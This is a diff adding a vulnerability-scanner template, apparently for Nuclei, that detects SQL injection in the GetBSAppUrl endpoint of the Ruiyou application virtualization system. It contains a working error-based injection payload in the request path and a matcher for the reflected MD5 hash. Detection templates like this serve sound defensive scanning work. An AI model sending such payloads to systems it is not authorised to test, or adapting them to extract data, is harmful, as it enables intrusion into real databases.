@@ -1,0 +1,22 @@
+id: poc-yaml-ruiyou-getbsappurl-sql-inject
+info:
+  name: 瑞友应用虚拟化系统 GetBSAppUrl SQL注入
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects SQL injection vulnerabilities in the 瑞友应用虚拟化系统 GetBSAppUrl endpoint by injecting payloads and checking for MD5 hash reflection.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?s=/Agent/GetBSAppUrl/AppID/1'+and+(extractvalue(1,concat(0x7e,(select+md5(10)),0x7e)))+and+'a'='a"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: word
+        part: body
+        words:
+          - "d3d9446802a44259755d38e6d163e82"
